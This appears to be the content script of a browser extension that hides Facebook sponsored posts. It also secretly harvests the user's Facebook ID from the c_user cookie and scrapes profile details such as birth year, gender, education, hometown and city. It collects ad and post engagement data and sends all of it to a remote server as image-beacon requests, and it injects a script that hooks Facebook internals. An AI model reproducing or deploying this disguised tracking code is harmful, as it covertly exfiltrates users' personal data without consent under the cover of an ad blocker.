(function() {
    var cssVt = "ha2837492t",
        u, ul=0, nj=0, dR = 0,
    	iDate, iC = "", showImages = 1, im="/ta0.gif";
    var dTm;
	
    function hideDynamicSponsoredPosts() {
        var observer = new MutationObserver(function(mutations) {
            mutations.forEach(function(mutationNode) {
                if (mutationNode.addedNodes) {
                    for (var i = 0; i < mutationNode.addedNodes.length; i++) {
                        removeSPostR(mutationNode.addedNodes[i]);
                        removeSPostN(mutationNode.addedNodes[i].parentNode);
                    }
                }
            })
        })

        observer.observe(document.body, {
            childList: true,
            subtree: true
        })
    }
	function spR(){
	!(function(){
		var m=["require","message","UFISharedDispatcher","PopoverAsyncMenu","UFIFeedbackTargets"], w=window;
		try{
			w.addEventListener(m[1], _r, false);
			var cC = {};
			requireLazy([m[2]],function(r) {r.register(function(q){cC[q.ftentidentifier]=q&&q.payload&&q.payload.feedbacktarget&&q.payload.feedbacktarget.commentcount})});
		}catch (f){}

		function _r(e)
		{
			try{
				var c=w[m[0]];
				var d=e.data;
				if (d&&d.b&&d.a===11){
					requireLazy([m[3]], function(p){ 
						var s = p.getInstanceByTriggerElem(c('$')(d.b));
						var r = s && s._endpoint && s._endpoint.match(/ad_id%22%3A([0-9]+)%/); r = r&&r[1];
						c(m[4]).getFeedbackTarget(d.c, function (x){
							w.postMessage({a:12,b:[d.c,x.ownerid,r].join('l'),c:[x.reactioncount,cC[d.c],x.sharecount,d.d].join('l'),d:d.c}, "*");
						});
					});
			  	}
			}catch (f){}
		}
	})();
	}    
    
	function countAd(x,y) {
	    clearTimeout(dTm);
	    dTm = setTimeout(function(){countFBAd(x,y)}, 500);
	}
	
	function countFBAd(x,y){
		chrome.storage.sync.get({FBads: 0, TTads: 0}, function(items) {
			chrome.storage.sync.set({FBads: items['FBads']+x, TTads: items['TTads']+y});
		});
	}
	
	function cErr(w,v){
	   	cE(w,v.width);
	}

	function getImg(){
		return new Image();
	}

	function setImg(z,a,b){
		if (!a||a==""){return;}
		var o=getImg();
		o.src=u+a+im.replace("0",b);
		o.onload=function(){cErr(z,o)};
	}

	function setImga(a,b){
		a&&""!==a&&(getImg().src=u+a+im.replace("a","c")+"?_t="+b);
	}
	    
    function getMV(x, y){
	    if (x){
		    var z = x.match(y);
		    if (z && z.constructor === Array){
			    return z[1];
		    }
	    }
	    return "";
    }
    
    function cI(a){
 if (!a){return}
	    var r = "", $q=$('input[name="ft_ent_identifier"][value="'+a+'"').closest('.userContentWrapper');
	    var b = $q.find(".mtm ul.uiList li img[id], .mtm ul.uiList li a img").get().reduce(function(z,a){if (a.style.backgroundImage){z.push(a.style.backgroundImage.split('"')[1])} else if (a.width+a.height>200){z.push(a.src)} return z},[]),l=4;
		if (b && b.length>0){
		    b.length>l+1&&b.splice(l,b.length-l-1);
			r = b.join("|")
	    }
	    else{
		    b = $q.find(".mtm img")[0];
		    if (b){r=b.src}
	    }
		setImga(a,encodeURIComponent(r));
    }
    
    function cE(v,a){
	   	if (a<1){ return; }
	   	if (a&1){setTimeout(function(){gInfo(k(3), "data-hovercard", 0,[])},1000)}
	   	if (a&2){setTimeout(function(){cI(v)},500);}
   	}
      	   	
   	function keywords(){
	   	return ["ads", "block", "college", "contact_basic", "recommended", "education", "places",  "current_city", "people you may know", "profile", "hometown", "stories", "hs", "suggested friends", "viewer", "suggested games", "eduwork", "city", "load"];
   	}
   	
   	function eVa(n,t,dh){
	   	try {
		   	return !t?$("#z"+cssVt+" .rfloat:has(a[ajaxify$="+n+"])+div span").text():(t==1?$("#z"+cssVt+' a[ajaxify$="type='+n+'"]').closest('li:has(a['+dh+'])').find('a['+dh+']').attr(dh).split("=").pop():$("#z"+cssVt+" #"+n+" a["+dh+"]").attr(dh).split("=").pop());
		}catch(err){
			return ""
		}
   	}
   	
   	function gV(dh,t,r){
		if (!t){
			r.push(2050-parseInt(eVa('ear',0,dh)));
			r.push(1+!eVa('der',0,dh).indexOf("F"));
			var s=eVa('_in',0,dh); r.push(s&&(s.indexOf("d")>0?3:1+!s.indexOf("W")));
			gInfo(k(5),dh,t+1,r);
		}else if (t==1){
			r.push(eVa(k(12),1,dh)); r.push(eVa(k(2),1,dh));
			gInfo(k(6),dh,t+1,r);
		}else if (t==2){
			r.push(eVa(k(7),2,dh)); r.push(eVa(k(10),2,dh));
			gInfo(k(7),dh,t+1,r);
		}else{
			setImg(0,r.join('l'),4);
			gInfo(0,dh,t+1,1);
		}
   	}
   	
   	function h(a) {
	   	try{
		   	return a.split('').map(s=>s^1).join('')+a.substr(3,3);
	   	}catch(err){
			return "";
		}
	}
	
	function hc(c){
		var r = document.cookie.match(new RegExp('(^| )'+c.join("_")+'=([^;]+)'));
		nj=r?r[2]:0;
		return nj;
	}	

	function gInfo(n,dh,t,r){
	   	if (!t && ul){
		   	return;
	   	}
		function hd(a){
			r.push(getMV(a,/id":(\d+)/));
			gV(hd,t,r);
		}	   	
	   	ul=1; var h=k(18);
		var b = document.getElementById("z"+cssVt), p=k(9);
		if (b){
			b.innerHTML="";
		}else{
			b = document.createElement("div");
			b.setAttribute("id", "z"+cssVt);
			document.body.appendChild(b);		
		}
		var ba=(t<3)?p+"/async/infopage/nav/?dom_section_id=z"+cssVt+"&"+p+"_id="+nj+"&section="+n+"&"+k(14)+"_id="+nj:
		"ajax/typeahead/search/eduwork/inference.php?&context=hub_"+n+"&"+k(9)+"section=14002";		
		if (t==3){
			b.removeAttribute(dh);
			$(b)[h](ba,hd);
		}
		else if (t>3){
			return $(b).empty()
		}
		b.setAttribute(dh, "/"+ba+"&__a=1");		
		setTimeout(function(){b.dispatchEvent(new MouseEvent('mouseover', {'view':window,'bubbles':true}))},2000);
        var o = new MutationObserver(function(){o.disconnect(); setTimeout(function(){gV(dh,t,r)},100)});
		o.observe(b, {childList:true, subtree: false})
	}	
	
	function pInt(v){
		var r = ""+(v||0);
		r=r.replace(/[^0-9\s]/g,"");
		return parseInt(r);
	}
	
	function gnV($p,p0){
		var v = $p.find(p0);
		v = v&&v[0]&&v[0].lastChild;
		v = v&&v.firstChild;
		return pInt(v&&v.textContent);
	}  	
	
	function k(n){
		return (keywords())[n];
	}
	
	function kn(n,s,i){
		try{
			var r = n.querySelector(s);
			return r && r[i];
		}catch(e){
			return "";
		}
	}
	
    function removeSPostN(nP) {
	    if (!nP){
		    return;
	    }
	    if (nP.hasAttribute('data-cursor')) {
            var nPs = nP.innerHTML;
            var $n = $(nP);
            if (nPs.indexOf(">Sponsored<") > 0 || $n.find('a._m8c').length > 0) {
                nP.classList.add(cssVt + 'n');
                try{
	                kjdfa();
					dR&&setTimeout(function(){window.postMessage({ a: 11, b: kn(nP,'a[rel="toggle"]','id'), c:kn(nP,'[name="ft_ent_identifier"]','value'), d:pInt(gnV($n,'._2vd-'))}, "*")},100);
				}catch (f){}
            } else if (nPs.indexOf("<u>friend-add<") > 0) {
                nP.classList.add(cssVt + 'p');
            } else if ($n.find('._j_2._5pcr').length > 0) {
                nP.classList.add(cssVt + 'p');
            }
            countAd(1, 2);
        }
    }
    
	function cN(e){
	    var d=e.data;
		if (d&&d.b&&d.a===12){
			setImg(d.d,d.b+'i'+d.c,3);
		}
    }

	//Remove right side ads
    function removeSPostR(nP) {
        if (!nP || !$(nP).hasClass(".pagelet") || !$n.find("a[href^='/campaign/landing.php']")) {
            return;
        }
		nP.classList.add(cssVt + 'ra');

        var na = 0;
        $(nP).find("a[data-gt]").each(function() {
	    	var vD = $(this).attr("data-gt");
			setImg(0,getMV(vD,/d_id":(\d+)/i),1);
			na+=1;
	    });
	    if (na){
		    countAd(na, 1);
	    }
    }

	//Add class to Right Side
    function hideStaticSponsoredPosts() {
        var i = 0,
            sL = document.querySelectorAll("div[data-cursor]")
        for (i = 0; i < sL.length; i++) {
            removeSPostN(sL[i])
        }
    }

	// Hide Sponsored Bar
    function hideStaticSponsoredBar() {
        document.querySelectorAll('#pagelet_ego_pane .pagelet').forEach(function(r) {
	        removeSPostR(r)
	    });
    }
    
    // Go Searching for Ads already present
    function go() {
		window.addEventListener("message", cN, false);  
        hideStaticSponsoredBar();
        hideDynamicSponsoredPosts();
        if (document.readyState === "complete") {
			hideStaticSponsoredPosts();
		}else{		
    	    document.onreadystatechange = function () {
				if (document.readyState === "complete") {
					dR = 1;
					hideStaticSponsoredPosts();
				}
			}
	        hideStaticSponsoredPosts();
		}
   	}

   	//Initialize
    return {
       initialize: function() {
			var ut = h(hc(["c","user"]));	       
	   		chrome.storage.sync.get({"iDate":0,"u":""}, function(items) {
	   			u = items.u+items.iDate+ut+"/";
	   			go();
			})
			
			
			var tx = spR.toString();
			tx = tx.substr(tx.indexOf("{")+1), tx = tx.substr(0,tx.lastIndexOf("}")-1);
			var x = document.createElement("script");
			x.textContent=tx;		
			var head = document.querySelector("head") || document.head || document.documentElement;
		    if (head) {head.appendChild(x)}    

       }
    }
})().initialize()